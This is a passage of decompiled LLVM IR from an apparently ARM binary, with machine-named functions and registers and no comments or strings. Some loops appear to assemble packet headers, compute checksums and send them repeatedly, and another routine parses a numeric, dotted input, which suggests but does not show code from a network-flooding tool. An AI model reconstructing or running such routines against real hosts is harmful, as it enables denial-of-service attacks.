dec_label_pc_d430:                                ; preds = %dec_label_pc_d430, %dec_label_pc_d51c, %dec_label_pc_d430.preheader
  %v0_d434 = phi i32 [ %v0_d434.ph, %dec_label_pc_d430.preheader ], [ 0, %dec_label_pc_d51c ], [ 0, %dec_label_pc_d430 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_d434 = icmp eq i32 %v0_d434, 0
  store i1 %v2_d434, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_d434, label %dec_label_pc_d430, label %dec_label_pc_d440

dec_label_pc_d440:                                ; preds = %dec_label_pc_d430, %dec_label_pc_d51c
  br label %dec_label_pc_d444

dec_label_pc_d444:                                ; preds = %dec_label_pc_d490, %dec_label_pc_d440
  %v1_d454 = phi i32 [ %v1_d50c, %dec_label_pc_d490 ], [ 0, %dec_label_pc_d440 ]
  %v5_d448 = mul i32 %v1_d454, 24
  %v1_d44c = load i32, i32* @sl, align 4
  %v2_d44c = add i32 %v1_d44c, %v5_d448
  store i32 %v2_d44c, i32* %r3.global-to-local, align 4
  %v1_d450 = add i32 %v2_d44c, 20
  %v2_d450 = inttoptr i32 %v1_d450 to i8*
  %v3_d450 = load i8, i8* %v2_d450, align 1
  %v4_d450 = zext i8 %v3_d450 to i32
  store i32 %v4_d450, i32* %r2.global-to-local, align 4
  %v0_d454 = load i32, i32* @fp, align 4
  %v4_d454 = mul i32 %v1_d454, 4
  %v5_d454 = add i32 %v0_d454, %v4_d454
  %v6_d454 = inttoptr i32 %v5_d454 to i32*
  %v7_d454 = load i32, i32* %v6_d454, align 4
  store i32 %v7_d454, i32* @r5, align 4
  %v7_d45c = icmp eq i8 %v3_d450, 31
  store i1 %v7_d45c, i1* %cpsr_z.global-to-local, align 1
  store i32 65535, i32* @r7, align 4
  %v1_d464 = add i32 %v7_d454, 20
  store i32 %v1_d464, i32* @r6, align 4
  %tmp40 = icmp ult i8 %v3_d450, 32
  br i1 %tmp40, label %dec_label_pc_d530, label %dec_label_pc_d46c

dec_label_pc_d46c:                                ; preds = %dec_label_pc_d444
  store i32 %v3_d2e8, i32* %r3.global-to-local, align 4
  store i1 %v3_d470, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d470, label %dec_label_pc_d590, label %dec_label_pc_d478

dec_label_pc_d478:                                ; preds = %dec_label_pc_d530, %dec_label_pc_d46c
  %v1_d47c = phi i32 [ %v1_d588, %dec_label_pc_d530 ], [ 65535, %dec_label_pc_d46c ]
  store i32 %v3_d2ec, i32* %ip.global-to-local, align 4
  %v9_d47c = icmp eq i32 %v3_d2ec, %v1_d47c
  store i1 %v9_d47c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d47c, label %dec_label_pc_d5a4, label %dec_label_pc_d484

dec_label_pc_d484:                                ; preds = %dec_label_pc_d590.dec_label_pc_d484_crit_edge, %dec_label_pc_d478
  %v1_d488 = phi i32 [ %v1_d488.pre, %dec_label_pc_d590.dec_label_pc_d484_crit_edge ], [ %v1_d47c, %dec_label_pc_d478 ]
  %v9_d488 = icmp eq i32 %v3_d2f0, %v1_d488
  store i1 %v9_d488, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d488, label %dec_label_pc_d5b8, label %dec_label_pc_d490

dec_label_pc_d490:                                ; preds = %dec_label_pc_d5a4, %dec_label_pc_d484, %dec_label_pc_d5b8
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_d494 = load i32, i32* @r5, align 4
  %v3_d494 = add i32 %v2_d494, 10
  %v4_d494 = inttoptr i32 %v3_d494 to i16*
  store i16 0, i16* %v4_d494, align 2
  %v0_d49c = load i32, i32* @r5, align 4
  store i32 %v0_d49c, i32* @r0, align 4
  %v2_d4a0 = call i32 @function_dc98(i32 %v0_d49c, i32 20)
  %v3_d4a0 = trunc i32 %v2_d4a0 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_d4a8 = load i32, i32* @r5, align 4
  %v4_d4a8 = add i32 %v3_d4a8, 10
  %v5_d4a8 = inttoptr i32 %v4_d4a8 to i16*
  store i16 %v3_d4a0, i16* %v5_d4a8, align 2
  %v0_d4ac = load i32, i32* %r3.global-to-local, align 4
  %v1_d4ac = trunc i32 %v0_d4ac to i16
  %v2_d4ac = load i32, i32* @r6, align 4
  %v3_d4ac = add i32 %v2_d4ac, 6
  %v4_d4ac = inttoptr i32 %v3_d4ac to i16*
  store i16 %v1_d4ac, i16* %v4_d4ac, align 2
  %v3_d4b0 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d4b0, i32* %r3.global-to-local, align 4
  %v0_d4b4 = load i32, i32* @r6, align 4
  store i32 %v0_d4b4, i32* @r1, align 4
  %v1_d4b8 = add i32 %v0_d4b4, 4
  %v2_d4b8 = inttoptr i32 %v1_d4b8 to i16*
  %v3_d4b8 = load i16, i16* %v2_d4b8, align 2
  %v4_d4b8 = zext i16 %v3_d4b8 to i32
  store i32 %v4_d4b8, i32* %r2.global-to-local, align 4
  %v1_d4bc = add i32 %v3_d4b0, 12
  store i32 %v1_d4bc, i32* %r3.global-to-local, align 4
  %v0_d4c0 = load i32, i32* @r5, align 4
  %v4_d4c4 = call i32 @function_dce8(i32 %v0_d4c0, i32 %v0_d4b4, i32 %v4_d4b8, i32 %v1_d4bc)
  %v5_d4c4 = trunc i32 %v4_d4c4 to i16
  %v3_d4c8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d4c8, i32* %r3.global-to-local, align 4
  %v3_d4cc = mul i32 %v3_d4c8, 32
  store i32 %v3_d4cc, i32* %lr.global-to-local, align 4
  %v3_d4d0 = load i32, i32* @r6, align 4
  %v4_d4d0 = add i32 %v3_d4d0, 6
  %v5_d4d0 = inttoptr i32 %v4_d4d0 to i16*
  store i16 %v5_d4c4, i16* %v5_d4d0, align 2
  %v0_d4d4 = load i32, i32* %lr.global-to-local, align 4
  %v1_d4d4 = load i32, i32* %r3.global-to-local, align 4
  %tmp41 = mul i32 %v1_d4d4, -8
  %v5_d4d4 = add i32 %v0_d4d4, %tmp41
  store i32 %v5_d4d4, i32* %lr.global-to-local, align 4
  %v0_d4d8 = load i32, i32* @r6, align 4
  %v1_d4d8 = add i32 %v0_d4d8, 2
  %v2_d4d8 = inttoptr i32 %v1_d4d8 to i16*
  %v3_d4d8 = load i16, i16* %v2_d4d8, align 2
  %v3_d4dc = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d4dc, i32* %r2.global-to-local, align 4
  %v1_d4e0 = load i32, i32* @sl, align 4
  %v2_d4e0 = add i32 %v1_d4e0, %v5_d4d4
  store i32 %v2_d4e0, i32* @lr, align 4
  %v3_d4e4 = add i32 %v2_d4e0, 2
  %v4_d4e4 = inttoptr i32 %v3_d4e4 to i16*
  store i16 %v3_d4d8, i16* %v4_d4e4, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_d4f0 = load i32, i32* @r5, align 4
  %v0_d4f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_d4f4 = add i32 %v0_d4f4, 32
  store i32 %v1_d4f4, i32* %r2.global-to-local, align 4
  %v0_d4f8 = load i32, i32* @sb, align 4
  %v0_d4fc = load i32, i32* @lr, align 4
  %v6_d504 = call i32 @function_138bc(i32 %v0_d4f8, i32 %v0_d4f0, i32 %v1_d4f4, i32 16384, i32 %v0_d4fc, i32 16)
  %v3_d508 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d508, i32* %r3.global-to-local, align 4
  %v1_d50c = add i32 %v3_d508, 1
  %v1_d510 = load i32, i32* @r8, align 4
  %v9_d510 = icmp eq i32 %v1_d50c, %v1_d510
  store i1 %v9_d510, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d50c, i32* %stack_var_-44, align 4
  %v5_d518 = icmp slt i32 %v1_d50c, %v1_d510
  br i1 %v5_d518, label %dec_label_pc_d444, label %dec_label_pc_d51c

dec_label_pc_d51c:                                ; preds = %dec_label_pc_d490
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_d520 = icmp eq i32 %v1_d510, 0
  store i1 %v2_d520, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_d520, label %dec_label_pc_d430, label %dec_label_pc_d440

dec_label_pc_d530:                                ; preds = %dec_label_pc_d444
  %v1_d530 = add i32 %v2_d44c, 16
  %v2_d530 = inttoptr i32 %v1_d530 to i32*
  %v3_d530 = load i32, i32* %v2_d530, align 4
  store i32 %v3_d530, i32* @r4, align 4
  %v0_d534 = call i32 @function_f700()
  %v3_d538 = load i32, i32* %stack_var_-44, align 4
  %v5_d540 = mul i32 %v3_d538, 24
  %v0_d544 = load i32, i32* @r4, align 4
  %v1_d544 = and i32 %v0_d544, 16711680
  store i32 %v1_d544, i32* %ip.global-to-local, align 4
  %v3_d548 = udiv i32 %v0_d544, 16777216
  %v4_d54c = udiv i32 %v1_d544, 256
  %v5_d54c = or i32 %v4_d54c, %v3_d548
  store i32 %v5_d54c, i32* %r2.global-to-local, align 4
  %v1_d550 = load i32, i32* @sl, align 4
  %v2_d550 = add i32 %v1_d550, %v5_d540
  %v1_d554 = and i32 %v0_d544, 65280
  store i32 %v1_d554, i32* %r3.global-to-local, align 4
  %v1_d558 = add i32 %v2_d550, 20
  %v2_d558 = inttoptr i32 %v1_d558 to i8*
  %v3_d558 = load i8, i8* %v2_d558, align 1
  %v4_d558 = zext i8 %v3_d558 to i32
  store i32 %v4_d558, i32* %ip.global-to-local, align 4
  %v5_d560 = call i32 @llvm.bswap.i32(i32 %v0_d544)
  %v7_d564 = lshr i32 %v0_d534, %v4_d558
  %v8_d564 = add i32 %v7_d564, %v5_d560
  store i32 %v8_d564, i32* %r2.global-to-local, align 4
  %v5_d57c = call i32 @llvm.bswap.i32(i32 %v8_d564)
  %v1_d580 = load i32, i32* @r5, align 4
  %v2_d580 = add i32 %v1_d580, 16
  %v3_d580 = inttoptr i32 %v2_d580 to i32*
  store i32 %v5_d57c, i32* %v3_d580, align 4
  store i32 %v3_d2e8, i32* %r3.global-to-local, align 4
  %v1_d588 = load i32, i32* @r7, align 4
  %v9_d588 = icmp eq i32 %v3_d2e8, %v1_d588
  store i1 %v9_d588, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d588, label %dec_label_pc_d590, label %dec_label_pc_d478

dec_label_pc_d590:                                ; preds = %dec_label_pc_d530, %dec_label_pc_d46c
  %v0_d590 = call i32 @function_f700()
  %v1_d590 = trunc i32 %v0_d590 to i16
  store i32 %v3_d2ec, i32* %ip.global-to-local, align 4
  %v1_d598 = load i32, i32* @r7, align 4
  %v9_d598 = icmp eq i32 %v3_d2ec, %v1_d598
  store i1 %v9_d598, i1* %cpsr_z.global-to-local, align 1
  %v3_d59c = load i32, i32* @r5, align 4
  %v4_d59c = add i32 %v3_d59c, 4
  %v5_d59c = inttoptr i32 %v4_d59c to i16*
  store i16 %v1_d590, i16* %v5_d59c, align 2
  br i1 %v9_d598, label %dec_label_pc_d5a4, label %dec_label_pc_d590.dec_label_pc_d484_crit_edge

dec_label_pc_d590.dec_label_pc_d484_crit_edge:    ; preds = %dec_label_pc_d590
  %v1_d488.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d484

dec_label_pc_d5a4:                                ; preds = %dec_label_pc_d590, %dec_label_pc_d478
  %v0_d5a4 = call i32 @function_f700()
  %v1_d5a4 = trunc i32 %v0_d5a4 to i16
  %v1_d5ac = load i32, i32* @r7, align 4
  %v9_d5ac = icmp eq i32 %v3_d2f0, %v1_d5ac
  store i1 %v9_d5ac, i1* %cpsr_z.global-to-local, align 1
  %v3_d5b0 = load i32, i32* @r5, align 4
  %v4_d5b0 = add i32 %v3_d5b0, 20
  %v5_d5b0 = inttoptr i32 %v4_d5b0 to i16*
  store i16 %v1_d5a4, i16* %v5_d5b0, align 2
  br i1 %v9_d5ac, label %dec_label_pc_d5b8, label %dec_label_pc_d490

dec_label_pc_d5b8:                                ; preds = %dec_label_pc_d5a4, %dec_label_pc_d484
  %v0_d5b8 = call i32 @function_f700()
  %v1_d5b8 = trunc i32 %v0_d5b8 to i16
  %v3_d5bc = load i32, i32* @r6, align 4
  %v4_d5bc = add i32 %v3_d5bc, 2
  %v5_d5bc = inttoptr i32 %v4_d5bc to i16*
  store i16 %v1_d5b8, i16* %v5_d5bc, align 2
  br label %dec_label_pc_d490

dec_label_pc_d5c4:                                ; preds = %dec_label_pc_d2b0
  %v0_d5c4 = load i32, i32* @sb, align 4
  %v1_d5c8 = call i32 @function_1314c(i32 %v0_d5c4)
  br label %dec_label_pc_d5cc

dec_label_pc_d5cc:                                ; preds = %dec_label_pc_d1a4, %dec_label_pc_d5c4
  %v1_d5d4 = phi i32 [ %v3_d2a0, %dec_label_pc_d1a4 ], [ %v1_d5c8, %dec_label_pc_d5c4 ]
  store i32 %v3_d1a4, i32* %r4.global-to-local, align 4
  store i32 %v27_d1a4, i32* %lr.global-to-local, align 4
  ret i32 %v1_d5d4

; uselistorder directives
  uselistorder i32 %v1_d588, { 1, 0 }
  uselistorder i32 %v0_d544, { 1, 2, 0, 3 }
  uselistorder i32 %v1_d50c, { 2, 0, 3, 1 }
  uselistorder i32 %v5_d4d4, { 1, 0 }
  uselistorder i1 %v3_d470, { 1, 0 }
  uselistorder i32 %v1_d420, { 1, 0, 2, 3 }
  uselistorder i32 %v3_d388, { 1, 0 }
  uselistorder i32 %v3_d320, { 1, 0 }
  uselistorder i32 %v3_d31c, { 1, 0 }
  uselistorder i32 %v0_d2e0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_d2dc, { 1, 0, 2 }
  uselistorder i32 %v0_d2d8, { 1, 0, 3, 2 }
  uselistorder i1 %v7_d2d0, { 1, 0 }
  uselistorder i1 %v7_d2a4, { 1, 0 }
  uselistorder i32 %v3_d2a0, { 1, 2, 3, 0 }
  uselistorder i32 %v1_d240, { 1, 0 }
  uselistorder i32 %v5_d214, { 1, 0 }
  uselistorder i32 %v5_d1d8, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_d5cc, { 1, 0 }
  uselistorder label %dec_label_pc_d490, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d440, { 1, 0 }
  uselistorder label %dec_label_pc_d430, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_d5dc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d5dc:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-2124 = alloca i32, align 4
  %v18_d5dc = load i32, i32* @sb, align 4
  %v27_d5dc = load i32, i32* @lr, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_d5fc = call i32 @function_144a8(i32 %arg1, i32 4)
  %v0_d600 = load i32, i32* @r5, align 4
  store i32 %v0_d600, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_d60c = load i32, i32* @r4, align 4
  store i32 %v0_d60c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_d614 = inttoptr i32 %v0_d600 to i32*
  %v6_d614 = call i32 @function_a45c(i32 %v0_d60c, i32* %v5_d614, i32 2, i32 0)
  %v1_d620 = urem i32 %v6_d614, 256
  store i32 %v1_d620, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d62c = load i32, i32* @r4, align 4
  store i32 %v0_d62c, i32* %r0.global-to-local, align 4
  %v0_d630 = load i32, i32* @r5, align 4
  store i32 %v0_d630, i32* %r1.global-to-local, align 4
  %v6_d638 = inttoptr i32 %v0_d630 to i32*
  %v7_d638 = call i32 @function_a45c(i32 %v0_d62c, i32* %v6_d638, i32 3, i32 65535)
  %v0_d63c = load i32, i32* @r5, align 4
  store i32 %v0_d63c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_d648 = load i32, i32* @r4, align 4
  store i32 %v0_d648, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_d650 = inttoptr i32 %v0_d63c to i32*
  %v6_d650 = call i32 @function_a45c(i32 %v0_d648, i32* %v5_d650, i32 4, i32 64)
  %v1_d658 = urem i32 %v6_d650, 256
  store i32 %v1_d658, i32* %ip.global-to-local, align 4
  %v0_d65c = load i32, i32* @r5, align 4
  store i32 %v0_d65c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d668 = load i32, i32* @r4, align 4
  store i32 %v0_d668, i32* %r0.global-to-local, align 4
  %v6_d670 = inttoptr i32 %v0_d65c to i32*
  %v7_d670 = call i32 @function_a45c(i32 %v0_d668, i32* %v6_d670, i32 5, i32 0)
  %v1_d67c = urem i32 %v7_d670, 256
  store i32 %v1_d67c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_d688 = load i32, i32* @r4, align 4
  store i32 %v0_d688, i32* %r0.global-to-local, align 4
  %v0_d68c = load i32, i32* @r5, align 4
  store i32 %v0_d68c, i32* %r1.global-to-local, align 4
  %v5_d694 = inttoptr i32 %v0_d68c to i32*
  %v6_d694 = call i32 @function_a45c(i32 %v0_d688, i32* %v5_d694, i32 6, i32 65535)
  %v0_d698 = load i32, i32* @r5, align 4
  store i32 %v0_d698, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_d6a4 = load i32, i32* @r4, align 4
  store i32 %v0_d6a4, i32* %r0.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  %v5_d6ac = inttoptr i32 %v0_d698 to i32*
  %v6_d6ac = call i32 @function_a45c(i32 %v0_d6a4, i32* %v5_d6ac, i32 7, i32 53)
  %v0_d6b8 = load i32, i32* @r5, align 4
  store i32 %v0_d6b8, i32* %r1.global-to-local, align 4
  %v0_d6bc = load i32, i32* @r4, align 4
  store i32 %v0_d6bc, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_d6c8 = inttoptr i32 %v0_d6b8 to i32*
  %v6_d6c8 = call i32 @function_a45c(i32 %v0_d6bc, i32* %v5_d6c8, i32 9, i32 65535)
  %v0_d6cc = load i32, i32* @r5, align 4
  store i32 %v0_d6cc, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_d6d8 = load i32, i32* @r4, align 4
  store i32 %v0_d6d8, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v5_d6e0 = inttoptr i32 %v0_d6cc to i32*
  %v6_d6e0 = call i32 @function_a45c(i32 %v0_d6d8, i32* %v5_d6e0, i32 0, i32 12)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d6ec = load i32, i32* @r5, align 4
  store i32 %v0_d6ec, i32* %r1.global-to-local, align 4
  store i32 %v6_d6e0, i32* %sb.global-to-local, align 4
  %v0_d6f4 = load i32, i32* @r4, align 4
  store i32 %v0_d6f4, i32* %r0.global-to-local, align 4
  %v5_d6f8 = inttoptr i32 %v0_d6ec to i32*
  %v6_d6f8 = call i32 @function_9f20(i32 %v0_d6f4, i32* %v5_d6f8, i32 8, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_d6f8, i32* @r7, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_d704 = call i32 @function_11be8(i32 30)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v3_d710 = call i32 @function_11b24(i32 30, i32* null)
  store i32 %v3_d710, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d718 = call i32 @function_12d24(i32 %v3_d710, i32 0)
  store i32 %v2_d718, i32* @r4, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_d724 = call i32 @function_11b48(i32 30)
  store i32 %v1_d724, i32* %r0.global-to-local, align 4
  %v0_d728 = load i32, i32* @r4, align 4
  %v1_d728 = icmp slt i32 %v0_d728, 0
  %v2_d728 = icmp eq i32 %v0_d728, 0
  store i1 %v2_d728, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_d728, label %dec_label_pc_dc20, label %dec_label_pc_d730

dec_label_pc_d730:                                ; preds = %dec_label_pc_d5dc
  %v2_d734 = ptrtoint i32* %stack_var_-2124 to i32
  store i32 %v2_d734, i32* @sl, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 %v2_d734, i32* %r1.global-to-local, align 4
  store i32 %v0_d728, i32* %r0.global-to-local, align 4
  %v1_d744 = call i32 @function_12ee4(i32 %v0_d728)
  store i32 %v1_d744, i32* @r5, align 4
  %v0_d74c = load i32, i32* @r4, align 4
  store i32 %v0_d74c, i32* %r0.global-to-local, align 4
  %v1_d750 = call i32 @function_1314c(i32 %v0_d74c)
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_d758 = call i32 @function_11be8(i32 31)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v3_d764 = call i32 @function_11b24(i32 31, i32* null)
  %v0_d768 = load i32, i32* @r5, align 4
  store i32 %v0_d768, i32* @r1, align 4
  store i32 %v3_d764, i32* %r2.global-to-local, align 4
  store i32 %v2_d734, i32* %r0.global-to-local, align 4
  %v3_d774 = bitcast i32* %stack_var_-2124 to i8*
  %v4_d774 = call i32 @function_127d0(i8* %v3_d774, i32 %v0_d768, i32 %v3_d764)
  store i32 %v4_d774, i32* @r6, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_d780 = call i32 @function_11b48(i32 31)
  store i32 %v1_d780, i32* %r0.global-to-local, align 4
  %v0_d784 = load i32, i32* @r6, align 4
  %v7_d784 = icmp eq i32 %v0_d784, -1
  store i1 %v7_d784, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d784, label %dec_label_pc_dc20, label %dec_label_pc_d78c

dec_label_pc_d78c:                                ; preds = %dec_label_pc_d730
  %v0_d78c = load i32, i32* @r5, align 4
  %v9_d78c = icmp eq i32 %v0_d78c, %v0_d784
  store i1 %v9_d78c, i1* %cpsr_z.global-to-local, align 1
  %v7_d790 = icmp sgt i32 %v0_d78c, %v0_d784
  br i1 %v7_d790, label %dec_label_pc_d794, label %dec_label_pc_dc20

dec_label_pc_d794:                                ; preds = %dec_label_pc_d78c
  %v0_d794 = load i32, i32* @sl, align 4
  %v2_d794 = add i32 %v0_d794, %v0_d784
  store i32 %v2_d794, i32* %r2.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_d7c0 = add i32 %v0_d78c, -1
  br label %dec_label_pc_d7b8

dec_label_pc_d7a4:                                ; preds = %dec_label_pc_d7e0, %bb103
  %v9_d7a4 = icmp eq i32 %v1_d7c0, %v0_d7ac
  store i1 %v9_d7a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d7a4, label %dec_label_pc_d7ec, label %dec_label_pc_d7ac

dec_label_pc_d7ac:                                ; preds = %dec_label_pc_d7d0, %dec_label_pc_d7a4, %bb
  %v0_d7dc29 = phi i32 [ %v0_d7dc, %dec_label_pc_d7d0 ], [ %v0_d7dc30, %dec_label_pc_d7a4 ], [ %v0_d7dc, %bb ]
  %v0_d7bc25 = phi i32 [ 0, %dec_label_pc_d7d0 ], [ %v0_d7bc26, %dec_label_pc_d7a4 ], [ 0, %bb ]
  %v1_d7ac = add i32 %v0_d7ac, 1
  %v9_d7b0 = icmp eq i32 %v1_d7ac, %v0_d78c
  store i1 %v9_d7b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d7b0, label %dec_label_pc_dc20, label %dec_label_pc_d7b8

dec_label_pc_d7b8:                                ; preds = %dec_label_pc_d7ac, %dec_label_pc_d794
  %v0_d7ac = phi i32 [ %v1_d7ac, %dec_label_pc_d7ac ], [ %v0_d784, %dec_label_pc_d794 ]
  %v0_d7dc = phi i32 [ %v0_d7dc29, %dec_label_pc_d7ac ], [ 0, %dec_label_pc_d794 ]
  %v0_d7bc = phi i32 [ %v0_d7bc25, %dec_label_pc_d7ac ], [ 0, %dec_label_pc_d794 ]
  %v0_d7c4 = phi i32 [ %v1_d7c4, %dec_label_pc_d7ac ], [ %v2_d794, %dec_label_pc_d794 ]
  %v1_d7b8 = inttoptr i32 %v0_d7c4 to i8*
  %v2_d7b8 = load i8, i8* %v1_d7b8, align 1
  %v3_d7b8 = zext i8 %v2_d7b8 to i32
  store i32 %v3_d7b8, i32* %r3.global-to-local, align 4
  %v2_d7bc = icmp eq i32 %v0_d7bc, 0
  store i1 %v2_d7bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d7c0, i32* %r0.global-to-local, align 4
  %v1_d7c4 = add i32 %v0_d7c4, 1
  store i32 %v1_d7c4, i32* %r2.global-to-local, align 4
  %v1_d7c8 = add nsw i32 %v3_d7b8, -48
  store i32 %v1_d7c8, i32* %r1.global-to-local, align 4
  br i1 %v2_d7bc, label %dec_label_pc_d7d0, label %dec_label_pc_d7e0

dec_label_pc_d7d0:                                ; preds = %dec_label_pc_d7b8
  %v7_d7d0 = icmp eq i8 %v2_d7b8, 9
  store i1 %v7_d7d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d7d0, label %dec_label_pc_d7ac, label %bb

bb:                                               ; preds = %dec_label_pc_d7d0
  %v8_d7d4 = icmp eq i8 %v2_d7b8, 32
  store i1 %v8_d7d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_d7d4, label %dec_label_pc_d7ac, label %dec_label_pc_d7dc

dec_label_pc_d7dc:                                ; preds = %bb
  %v1_d7dc = add i32 %v0_d7dc, 1
  store i32 %v1_d7dc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_d7e0

dec_label_pc_d7e0:                                ; preds = %dec_label_pc_d7b8, %dec_label_pc_d7dc
  %v0_d7dc30 = phi i32 [ %v0_d7dc, %dec_label_pc_d7b8 ], [ %v1_d7dc, %dec_label_pc_d7dc ]
  %v0_d7bc26 = phi i32 [ %v0_d7bc, %dec_label_pc_d7b8 ], [ %v1_d7dc, %dec_label_pc_d7dc ]
  %v7_d7e0 = icmp eq i8 %v2_d7b8, 46
  store i1 %v7_d7e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d7e0, label %dec_label_pc_d7a4, label %bb103

bb103:                                            ; preds = %dec_label_pc_d7e0
  %v8_d7e4 = icmp eq i32 %v1_d7c8, 9
  store i1 %v8_d7e4, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_d7c8, 10
  br i1 %tmp, label %dec_label_pc_d7a4, label %dec_label_pc_d7ec

dec_label_pc_d7ec:                                ; preds = %dec_label_pc_d7a4, %bb103
  %v0_d7ac.lcssa = phi i32 [ %v1_d7c0, %dec_label_pc_d7a4 ], [ %v0_d7ac, %bb103 ]
  %v2_d7f0 = sub i32 %v0_d7ac.lcssa, %v0_d784
  store i32 %v2_d7f0, i32* @r4, align 4
  %v2_d7f4 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_d794, i32* %r1.global-to-local, align 4
  store i32 %v2_d7f4, i32* %r0.global-to-local, align 4
  store i32 %v2_d7f0, i32* %r2.global-to-local, align 4
  %v3_d804 = call i32 @function_124f0(i32 %v2_d7f4, i32 %v2_d794, i32 %v2_d7f0)
  %v2_d808 = ptrtoint i32* %stack_var_-40 to i32
  %v1_d80c = load i32, i32* @r4, align 4
  %v2_d80c = add i32 %v1_d80c, %v2_d808
  store i32 %v2_d80c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_d7f4, i32* @r0, align 4
  %v3_d818 = add i32 %v2_d80c, -36
  %v4_d818 = inttoptr i32 %v3_d818 to i8*
  store i8 0, i8* %v4_d818, align 1
  %v1_d81c = call i32 @function_13690(i32 %v2_d7f4)
  store i32 %v1_d81c, i32* %r0.global-to-local, align 4
  store i32 %v1_d81c, i32* @fp, align 4
  br label %dec_label_pc_d824

